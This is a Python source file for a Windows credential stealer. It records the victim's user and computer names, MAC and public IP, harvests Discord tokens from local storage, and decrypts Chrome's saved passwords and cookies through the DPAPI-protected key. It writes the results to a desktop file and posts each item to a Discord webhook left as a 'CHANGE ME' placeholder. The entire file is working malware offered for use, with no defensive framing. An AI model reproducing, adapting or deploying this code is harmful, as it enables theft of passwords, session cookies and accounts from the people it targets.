import os
import json
import time
import base64
import shutil
import sqlite3
import requests
import win32crypt
from re import findall
from Crypto.Cipher import AES
from getmac import get_mac_address as getMacAddrr

#Guthmaer
allEnv={'appLocal':'LOCALAPPDATA',
        'appRoaming':'APPDATA',
        'pcName':'COMPUTERNAME',
        'userPath':'HOMEPATH',
        'username':'USERNAME'}
cookiePath={'Discord': os.getenv(key=allEnv.get('appRoaming')) + '\discord\Local Storage\leveldb',
            'ChormeLocalState': os.path.join(os.getenv(key=allEnv.get('appLocal')), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
            'ChormeLoginData': os.path.join(os.getenv(key=allEnv.get('appLocal')), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')}

#sharing information with discord webhooks
#webhook = Webhook.from_url("https://discord.com/api/webhooks/.........", adapter=RequestsWebhookAdapter())
webhookURL = "https://discord.com/api/webhooks/..............." #CHANGE ME

try:
    def victimInfo():
        global pcUser, pcName, pcMac, ipAddrr, writePath, writePathh
        pcUser= os.getenv(key=allEnv.get('username'))
        pcName= os.getenv(key=allEnv.get('pcName'))
        pcMac= getMacAddrr()
        ipAddrr= requests.get('https://api.ipify.org?format=json').json()['ip']
        writePath= os.path.join(os.environ["USERPROFILE"], "Desktop")
        writePath= writePath + '\writeVictimInfo.txt'

        with open(writePath,'w+', encoding="utf-8") as infoWrite:
            mem = infoWrite.read()
            infoWrite.seek(0)
            infoWrite.write(f'\npcUser: {pcUser} \npcName: {pcName} \npcMac: {pcMac} \nipAddrr: {ipAddrr}' + mem)

        embedTemp ={"title": "Victim Information", "description": "Computer Info", "color": 0, "fields": [{"name": "User","value": f"{pcUser}"},
            {"name": "Name","value": f"{pcName}"},{"name": "Mac Addrr","value": f"{pcMac}"}, {"name": "IP Addrr","value": f"{ipAddrr}"}]}
        jsonData = {"content": "" ,"username": f"{pcUser} | {pcName}","embeds": [embedTemp],}
        requests.post(webhookURL, json=jsonData)
    victimInfo()

    ###Start Discord Token Dump
    def dumpDiscordToken():
        dcToken= []
        tokenStructure= r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'
        for fileS in os.listdir(cookiePath.get('Discord')):
            if fileS.endswith('.ldb') or fileS.endswith('.log'):
                with open(cookiePath.get('Discord')+'\\'+fileS, 'r+', errors='ignore') as readText:
                    for textLines in readText.readlines():
                        oneLine= textLines.strip()
                        for tokenStructure in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for discordToken in findall(tokenStructure, oneLine):
                                if discordToken:
                                    dcToken.append(discordToken)
                                else:
                                    continue
        with open(writePath,'r+', encoding="utf-8") as infoWrite:
            mem = infoWrite.read()
            infoWrite.seek(0)
            infoWrite.write(f'Discord Token: {dcToken}\n' + mem)

        embedTemp ={"title": "Discord Token Information", "description": "", "color": 0, "fields": [{"name": "None","value": f"None"},
        {"name": "pcUser","value": f"{pcUser}"},{"name": "Discord Token","value": f"{dcToken}"}, {"name": "IP Addrr","value": f"{ipAddrr}"}]}
        jsonData = {"content": "" ,"username": f"{pcUser} | {pcName}","embeds": [embedTemp],}
        requests.post(webhookURL, json=jsonData)
    ###End of Discord Token Dump
    dumpDiscordToken()

    ###Start Chorme Pass and Cookie Dump
    def getChormeEncKey():
        chormeStatePath = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")
        with open(chormeStatePath, "r", encoding="utf-8") as fileRead:
            readState = fileRead.read()
            readState = json.loads(readState)
        encKey = base64.b64decode(readState["os_crypt"]["encrypted_key"])
        encKey = encKey[5:]
        return win32crypt.CryptUnprotectData(encKey, None, None, None, 0)[1]

    def chormeDecryptPassword(Password, encKey):
        try:
            iv = Password[3:15]
            Password = Password[15:]
            cipherKey = AES.new(encKey, AES.MODE_GCM, iv)
            return cipherKey.decrypt(Password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(Password, None, None, None, 0)[1])
            except:
                return ""

    def chormeDecryptData(data, encKey):
        try:
            iv = data[3:15]
            data = data[15:]
            cipherKey = AES.new(encKey, AES.MODE_GCM, iv)
            return cipherKey.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""

    def chormePasswordExtract():
        databasePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        passDatabase = "ChromeData.db"
        shutil.copyfile(databasePath, passDatabase)
        databaseConn = sqlite3.connect(passDatabase)
        cursorExec = databaseConn.cursor()
        cursorExec.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        encKey = getChormeEncKey()
        for allIn in cursorExec.fetchall():
            originURL = allIn[0]
            actionURL = allIn[1]
            Username = allIn[2]
            Password = chormeDecryptPassword(allIn[3], encKey)
            if Username or Password:
                with open(writePath,'r+', encoding="utf-8") as infoWrite:
                    mem = infoWrite.read()
                    infoWrite.seek(0)
                    infoWrite.write(f'URL: {originURL, actionURL}\n Username: {Username}\n Password: {Password}\n\n' + mem)

                embedTemp ={"title": "Password Information", "description": "", "color": 0, "fields": [{"name": "Domain-Host","value": f"{originURL} | {actionURL}"},
                    {"name": "Username","value": f"{Username}"},{"name": "Password","value": f"{Password}"}, {"name": "IP Addrr","value": f"{ipAddrr}"}]}
                jsonData = {"content": "" ,"username": f"{pcUser} | {pcName}","embeds": [embedTemp],}
                requests.post(webhookURL, json=jsonData)
            else:
                continue
        cursorExec.close()
        databaseConn.close()
    chormePasswordExtract()

    def chormeCookieExtract():
        databasePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Cookies")
        cookieFilename = "Cookies.db"
        shutil.copyfile(databasePath, cookieFilename)
        databaseConn = sqlite3.connect(cookieFilename)
        cursorExec = databaseConn.cursor()
        cursorExec.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
        encKey = getChormeEncKey()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursorExec.fetchall():
            if not value:
                decryptedValue = chormeDecryptData(encrypted_value, encKey)
            else:
                decryptedValue = value
            
            with open(writePath,'r+', encoding="utf-8") as infoWrite:
                mem = infoWrite.read()
                infoWrite.seek(0)
                infoWrite.write(f"Host: {host_key}\n Cookie Name: {name}\n Cookie Value (decryptedValue): {decryptedValue}\n\n" + mem)
            
            embedTemp ={"title": "Cookie Information", "description": "", "color": 0, "fields": [{"name": "Domain-Host","value": f"{host_key}"},
                    {"name": "Decrypted Cookie","value": f"{decryptedValue}"}, {"name": "IP Addrr","value": f"{ipAddrr}"}]}
            jsonData = {"content": "" ,"username": f"{pcUser} | {pcName}","embeds": [embedTemp],}
            requests.post(webhookURL, json=jsonData)
        databaseConn.close()
    ###End of Chorme Pass and Cookie Dump
    chormeCookieExtract()
except:
    print(writePath)
    pass
